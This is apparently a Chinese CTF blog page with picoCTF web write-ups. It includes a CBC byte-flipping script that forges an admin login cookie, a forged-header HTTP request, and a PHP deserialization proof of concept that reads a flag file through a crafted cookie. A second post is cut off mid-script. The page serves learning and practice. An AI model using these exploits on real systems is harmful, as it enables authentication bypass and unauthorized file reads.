<p>明文16字节为一组进行分组加密<br>拒绝admin账户的登录，使用cbc字节翻转攻击<br>构造登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;admix&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:2:&quot;123&quot;;&#125;　</span><br></pre></td></tr></table></figure>
<p>通过翻转<code>X</code>字符将admin账户传入。<br>更改密文后构造vi修复初始密文<br>解题脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8 -*-</span><br><span class="line">import base64</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># a:2:&#123;s:8:&quot;userna</span><br><span class="line"># me&quot;;s:5:&quot;admiN&quot;;</span><br><span class="line"># s:8:&quot;password&quot;;s</span><br><span class="line"># :6:&quot;123&quot;;&#125;</span><br><span class="line"> </span><br><span class="line">#原始cipher</span><br><span class="line">ciphertext = &#x27;w1uvgfzxxuYHA%2Bo08ZL%2BCefhwr2jHuwglOIBAh8cP1w5TCiCmY0Yy%2BQxelAl9%2B%2FiZeRvLD7UjzlF58bTGFZ%2BWQ%3D%3D&#x27;</span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(urllib.parse.unquote(ciphertext))</span><br><span class="line">array_cipher = bytearray(cipher)</span><br><span class="line">array_cipher[13] =  array_cipher[13]^ ord(&#x27;N&#x27;) ^ ord(&#x27;n&#x27;)</span><br><span class="line">#print(array_cipher)</span><br><span class="line">print(&#x27;newCipher:&#x27;,urllib.parse.quote(base64.b64encode(array_cipher)))</span><br><span class="line"></span><br><span class="line">#解密后的明文base64</span><br><span class="line">decode_plain = base64.b64decode(&#x27;sxvY7wUlyPgC+/iV7InfjG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&#x27;)</span><br><span class="line">#原始iv</span><br><span class="line">iv = base64.b64decode(urllib.parse.unquote(&#x27;1HxERxo2%2FTuymbrPoVDB%2Bw%3D%3D&#x27;))</span><br><span class="line">#原始明文</span><br><span class="line">plain = &#x27;a:2:&#123;s:8:&quot;userna&#x27;</span><br><span class="line"></span><br><span class="line">newiv = list(iv)</span><br><span class="line"></span><br><span class="line">for i in range(16):</span><br><span class="line">    newiv[i] = (ord(plain[i].encode(&#x27;utf-8&#x27;)) ^ iv[i] ^ decode_plain[i])</span><br><span class="line"></span><br><span class="line">newiv = bytes(newiv)</span><br><span class="line"></span><br><span class="line">print(&#x27;newiv:&#x27;,urllib.parse.quote(base64.b64encode(newiv)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="Some-Assembly-Required-1"><a href="#Some-Assembly-Required-1" class="headerlink" title="Some Assembly Required 1"></a>Some Assembly Required 1</h2><p>javascript-obfuscator解混淆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">const _0x6d8f = [</span><br><span class="line">  &#x27;copy_char&#x27;,</span><br><span class="line">  &#x27;value&#x27;,</span><br><span class="line">  &#x27;207aLjBod&#x27;,</span><br><span class="line">  &#x27;1301420SaUSqf&#x27;,</span><br><span class="line">  &#x27;233ZRpipt&#x27;,</span><br><span class="line">  &#x27;2224QffgXU&#x27;,</span><br><span class="line">  &#x27;check_flag&#x27;,</span><br><span class="line">  &#x27;408533hsoVYx&#x27;,</span><br><span class="line">  &#x27;instance&#x27;,</span><br><span class="line">  &#x27;278338GVFUrH&#x27;,</span><br><span class="line">  &#x27;Correct!&#x27;,</span><br><span class="line">  &#x27;549933ZVjkwI&#x27;,</span><br><span class="line">  &#x27;innerHTML&#x27;,</span><br><span class="line">  &#x27;charCodeAt&#x27;,</span><br><span class="line">  &#x27;./aD8SvhyVkb&#x27;,</span><br><span class="line">  &#x27;result&#x27;,</span><br><span class="line">  &#x27;977AzKzwq&#x27;,</span><br><span class="line">  &#x27;Incorrect!&#x27;,</span><br><span class="line">  &#x27;exports&#x27;,</span><br><span class="line">  &#x27;length&#x27;,</span><br><span class="line">  &#x27;getElementById&#x27;,</span><br><span class="line">  &#x27;1jIrMBu&#x27;,</span><br><span class="line">  &#x27;input&#x27;,</span><br><span class="line">  &#x27;615361geljRK&#x27;</span><br><span class="line">];</span><br><span class="line">const _0x5c00 = function (_0x58505a, _0x4d6e6c) &#123;</span><br><span class="line">  _0x58505a = _0x58505a - 195;</span><br><span class="line">  let _0x6d8fc4 = _0x6d8f[_0x58505a];</span><br><span class="line">  return _0x6d8fc4;</span><br><span class="line">&#125;;</span><br><span class="line">(function (_0x12fd07, _0x4e9d05) &#123;</span><br><span class="line">  const _0x4f7b75 = _0x5c00;</span><br><span class="line">  while (!![]) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      const _0x1bb902 = - parseInt(_0x4f7b75(200)) * - parseInt(_0x4f7b75(201)) + - parseInt(_0x4f7b75(205)) + parseInt(_0x4f7b75(207)) + parseInt(_0x4f7b75(195)) + - parseInt(_0x4f7b75(198)) * parseInt(_0x4f7b75(212)) + parseInt(_0x4f7b75(203)) + - parseInt(_0x4f7b75(217)) * parseInt(_0x4f7b75(199));</span><br><span class="line">      if (_0x1bb902 === _0x4e9d05) break;</span><br><span class="line">       else _0x12fd07[&#x27;push&#x27;](_0x12fd07[&#x27;shift&#x27;]());</span><br><span class="line">    &#125; catch (_0x4f8a) &#123;</span><br><span class="line">      _0x12fd07[&#x27;push&#x27;](_0x12fd07[&#x27;shift&#x27;]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;(_0x6d8f, 310022));</span><br><span class="line">let exports;</span><br><span class="line">(async() =&gt;&#123;</span><br><span class="line">  const _0x835967 = _0x5c00;</span><br><span class="line">  let _0x1adb5f = awaitfetch(_0x835967(210)),</span><br><span class="line">  _0x355961 = awaitWebAssembly[&#x27;instantiate&#x27;](await_0x1adb5f[&#x27;arrayBuffer&#x27;]()),</span><br><span class="line">  _0x5c0ffa = _0x355961[_0x835967(204)];</span><br><span class="line">  exports = _0x5c0ffa[_0x835967(214)];</span><br><span class="line">&#125;) ();</span><br><span class="line">function onButtonPress() &#123;</span><br><span class="line">  const _0x50ea62 = _0x5c00;</span><br><span class="line">  let _0x5f4170 = document[_0x50ea62(216)](_0x50ea62(218)) [_0x50ea62(197)];</span><br><span class="line">  for (let _0x19d3ca = 0; _0x19d3ca &lt; _0x5f4170[&#x27;length&#x27;]; _0x19d3ca++) &#123;</span><br><span class="line">    exports[_0x50ea62(196)](_0x5f4170[_0x50ea62(209)](_0x19d3ca), _0x19d3ca);</span><br><span class="line">  &#125;</span><br><span class="line">  exports[&#x27;copy_char&#x27;](0, _0x5f4170[_0x50ea62(215)]),</span><br><span class="line">  exports[_0x50ea62(202)]() == 1 ? document[&#x27;getElementById&#x27;](_0x50ea62(211)) [_0x50ea62(208)] = _0x50ea62(206)  : document[_0x50ea62(216)](_0x50ea62(211)) [&#x27;innerHTML&#x27;] = _0x50ea62(213);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>下载了一个通过webAssembly打包的js文件，flag以明文形式储存在文件中。<br>ob混淆还是不会做。。。。</p>
<h2 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h2><p>新颖的http头题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: mercury.picoctf.net.se:1270</span><br><span class="line">User-Agent: official PicoBrowser</span><br><span class="line">特殊浏览器</span><br><span class="line">Date: Thu, 11 Jul 2018 15:33:24 GMT</span><br><span class="line">特定时间</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: sv-SE</span><br><span class="line">语言</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Forwarded-For: 2.56.28.0</span><br><span class="line">国家位置</span><br><span class="line">Referer: mercury.picoctf.net:1270</span><br><span class="line">Connection: close</span><br><span class="line">DNT: 1</span><br><span class="line">拒绝跟踪</span><br><span class="line">Cookie: name=-1; session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YkGPoA.LOouJ_MDhpAP-qA8p1gOhTi0dUw; auth_name=QnZkTU9DdjB1NWtDMmJUdDBKSTJRTzFSdFBSMUpzVUx3UitrcnZEbjFYcHdPSGF3UHVrbGFWb0w5MlZZRU9vUWRkdG5USDcwdmZzWFhYcXVxOEQyelBJc3NCT2ZnVlhUSXM2RGRNMlR2cjRRVUFwaldtakZQTUNGcmtoSGpIN1U=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="super-serial"><a href="#super-serial" class="headerlink" title="super serial"></a>super serial</h2><p>查看页面，一个简易的登录页面，尝试sql注入未果<br>查看robots.txt<br>得到admin.phps,直接访问失败<br>既然存在admin.phps,可能存在index.phps<br>访问获得index.php源码<br>INDEX.PHP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">require_once(&quot;cookie.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;]))&#123;</span><br><span class="line">	$con = new SQLite3(&quot;../users.db&quot;);</span><br><span class="line">	$username = $_POST[&quot;user&quot;];</span><br><span class="line">	$password = $_POST[&quot;pass&quot;];</span><br><span class="line">	$perm_res = new permissions($username, $password);</span><br><span class="line">	if ($perm_resis_guest() || $perm_res-&gt;is_admin()) &#123;</span><br><span class="line">		setcookie(&quot;login&quot;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &quot;/&quot;);</span><br><span class="line">		header(&quot;Location: authentication.php&quot;);</span><br><span class="line">		die();</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$msg = &#x27;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">?php if (isset($msg)) echo $msg; ?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>authentication.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"></span><br><span class="line">class access_log</span><br><span class="line">&#123;</span><br><span class="line">	public $log_file;</span><br><span class="line"></span><br><span class="line">	function __construct($lf) &#123;</span><br><span class="line">		$this-log_file = $lf;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __toString() &#123;</span><br><span class="line">		return $this-&gt;read_log();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function append_to_log($data) &#123;</span><br><span class="line">		file_put_contents($this-&gt;log_file, $data, FILE_APPEND);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function read_log() &#123;</span><br><span class="line">		return file_get_contents($this-&gt;log_file);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">require_once(&quot;cookie.php&quot;);</span><br><span class="line">if(isset($perm) &amp;&amp; $perm-&gt;is_admin())&#123;</span><br><span class="line">	$msg = &quot;Welcome admin&quot;;</span><br><span class="line">	$log = new access_log(&quot;access.log&quot;);</span><br><span class="line">	$log-&gt;append_to_log(&quot;Logged in at &quot;.date(&quot;Y-m-d&quot;).&quot;\n&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$msg = &quot;Welcome guest&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>COOKIE.PHP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class permissions</span><br><span class="line">&#123;</span><br><span class="line">	public $username;</span><br><span class="line">	public $password;</span><br><span class="line"></span><br><span class="line">	function __construct($u, $p) &#123;</span><br><span class="line">		$this-username = $u;</span><br><span class="line">		$this-&gt;password = $p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __toString() &#123;</span><br><span class="line">		return $u.$p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function is_guest() &#123;</span><br><span class="line">		$guest = false;</span><br><span class="line"></span><br><span class="line">		$con = new SQLite3(&quot;../users.db&quot;);</span><br><span class="line">		$username = $this-&gt;username;</span><br><span class="line">		$password = $this-&gt;password;</span><br><span class="line">		$stm = $con-&gt;prepare(&quot;SELECT admin, username FROM users WHERE username=? AND password=?&quot;);</span><br><span class="line">		$stm-&gt;bindValue(1, $username, SQLITE3_TEXT);</span><br><span class="line">		$stm-&gt;bindValue(2, $password, SQLITE3_TEXT);</span><br><span class="line">		$res = $stm-&gt;execute();</span><br><span class="line">		$rest = $res-&gt;fetchArray();</span><br><span class="line">		if($rest[&quot;username&quot;]) &#123;</span><br><span class="line">			if ($rest[&quot;admin&quot;] != 1) &#123;</span><br><span class="line">				$guest = true;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return $guest;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        function is_admin() &#123;</span><br><span class="line">                $admin = false;</span><br><span class="line">                $con = new SQLite3(&quot;../users.db&quot;);</span><br><span class="line">                $username = $this-&gt;username;</span><br><span class="line">                $password = $this-&gt;password;</span><br><span class="line">                $stm = $con-&gt;prepare(&quot;SELECT admin, username FROM users WHERE username=? AND password=?&quot;);</span><br><span class="line">                $stm-&gt;bindValue(1, $username, SQLITE3_TEXT);</span><br><span class="line">                $stm-&gt;bindValue(2, $password, SQLITE3_TEXT);</span><br><span class="line">                $res = $stm-&gt;execute();</span><br><span class="line">                $rest = $res-&gt;fetchArray();</span><br><span class="line">                if($rest[&quot;username&quot;]) &#123;</span><br><span class="line">                        if ($rest[&quot;admin&quot;] == 1) &#123;</span><br><span class="line">                                $admin = true;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                return $admin;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&quot;login&quot;]))&#123;</span><br><span class="line">	try&#123;</span><br><span class="line">		$perm = unserialize(base64_decode(urldecode($_COOKIE[&quot;login&quot;])));</span><br><span class="line">		$g = $perm-&gt;is_guest();</span><br><span class="line">		$a = $perm-&gt;is_admin();</span><br><span class="line">	&#125;</span><br><span class="line">	catch(Error $e)&#123;</span><br><span class="line">		die(&quot;Deserialization error. &quot;.$perm);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>提示flag在目录中，不考虑sql注入。<br>看到了反序列化，考虑使用反序列化解题。<br>构造poc链：<br>目标：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function append_to_log($data) &#123;</span><br><span class="line">        file_put_contents($this-&gt;log_file, $data, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read_log() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;log_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过这里获得flag，<br>步骤1：到达authentication.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$perm_res = new permissions($username, $password);</span><br><span class="line">if ($perm_res-&gt;is_guest() || $perm_res-&gt;is_admin()) &#123;</span><br><span class="line">    setcookie(&quot;login&quot;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &quot;/&quot;);</span><br><span class="line">    header(&quot;Location: authentication.php&quot;);</span><br><span class="line">    die();</span><br></pre></td></tr></table></figure>

<p>步骤2：COOKIE传入入口，$perm对象创建</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_COOKIE[&quot;login&quot;]))&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">                $perm = unserialize(base64_decode(urldecode($_COOKIE[&quot;login&quot;])));</span><br><span class="line">                $g = $perm-&gt;is_guest();</span><br><span class="line">                $a = $perm-&gt;is_admin();</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Error $e)&#123;</span><br><span class="line">                die(&quot;Deserialization error. &quot;.$perm);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>梳理流程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perm_res-&gt;cookie::login——&gt;authentication.php::read_log()——&gt;error</span><br></pre></td></tr></table></figure>
<p>构建poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class access_log</span><br><span class="line">&#123;</span><br><span class="line">    public $log_file;</span><br><span class="line"></span><br><span class="line">    function __construct($lf) &#123;</span><br><span class="line">        $this-&gt;log_file = $lf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        return $this-&gt;read_log();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function append_to_log($data) &#123;</span><br><span class="line">        file_put_contents($this-&gt;log_file, $data, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function read_log() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;log_file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$perm_res = new access_log(&quot;../flag&quot;);</span><br><span class="line">$perm_res_encoded =  urlencode(base64_encode(serialize($perm_res)));</span><br><span class="line">echo $perm_res_encoded;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="picobrowser"><a href="#picobrowser" class="headerlink" title="picobrowser"></a>picobrowser</h2><p>更改user-agent为picobrowser<br>获得flag。。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/23/3-23/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/23/3-23/" class="post-title-link" itemprop="url">3m23</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-23 14:02:31 / 修改时间：18:30:36" itemprop="dateCreated datePublished" datetime="2022-03-23T14:02:31+08:00">2022-03-23</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pico宝宝巴士"><a href="#pico宝宝巴士" class="headerlink" title="pico宝宝巴士"></a><strong>pico</strong>宝宝巴士</h1><h2 id="Beginner-2022mini"><a href="#Beginner-2022mini" class="headerlink" title="Beginner 2022mini"></a>Beginner 2022mini</h2><p>大量的萌新题，由于刚开始没找到入口抽空做了下，把一些有代表性的放在一起了。</p>
<h5 id="codebook"><a href="#codebook" class="headerlink" title="codebook"></a>codebook</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_xor</span>(<span class="params">secret, key</span>):</span></span><br><span class="line">    <span class="comment">#extend key to secret length</span></span><br><span class="line">    new_key = key</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(new_key) &lt; <span class="built_in">len</span>(secret):</span><br><span class="line">        new_key = new_key + key[i]</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="built_in">len</span>(key)        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(secret_c) ^ <span class="built_in">ord</span>(new_key_c)) <span class="keyword">for</span> (secret_c,new_key_c) <span class="keyword">in</span> <span class="built_in">zip</span>(secret,new_key)])</span><br><span class="line"></span><br><span class="line">flag_enc = <span class="built_in">chr</span>(<span class="number">0x13</span>) + <span class="built_in">chr</span>(<span class="number">0x01</span>) + <span class="built_in">chr</span>(<span class="number">0x17</span>) + <span class="built_in">chr</span>(<span class="number">0x07</span>) + <span class="built_in">chr</span>(<span class="number">0x2c</span>) + <span class="built_in">chr</span>(<span class="number">0x3a</span>) + <span class="built_in">chr</span>(<span class="number">0x2f</span>) + <span class="built_in">chr</span>(<span class="number">0x1a</span>) + <span class="built_in">chr</span>(<span class="number">0x0d</span>) + <span class="built_in">chr</span>(<span class="number">0x53</span>) + <span class="built_in">chr</span>(<span class="number">0x0c</span>) + <span class="built_in">chr</span>(<span class="number">0x47</span>) + <span class="built_in">chr</span>(<span class="number">0x0a</span>) + <span class="built_in">chr</span>(<span class="number">0x5f</span>) + <span class="built_in">chr</span>(<span class="number">0x5e</span>) + <span class="built_in">chr</span>(<span class="number">0x02</span>) + <span class="built_in">chr</span>(<span class="number">0x3e</span>) + <span class="built_in">chr</span>(<span class="number">0x5a</span>) + <span class="built_in">chr</span>(<span class="number">0x56</span>) + <span class="built_in">chr</span>(<span class="number">0x5d</span>) + <span class="built_in">chr</span>(<span class="number">0x45</span>) + <span class="built_in">chr</span>(<span class="number">0x5d</span>) + <span class="built_in">chr</span>(<span class="number">0x58</span>) + <span class="built_in">chr</span>(<span class="number">0x31</span>) + <span class="built_in">chr</span>(<span class="number">0x51</span>) + <span class="built_in">chr</span>(<span class="number">0x50</span>) + <span class="built_in">chr</span>(<span class="number">0x5e</span>) + <span class="built_in">chr</span>(<span class="number">0x53</span>) + <span class="built_in">chr</span>(<span 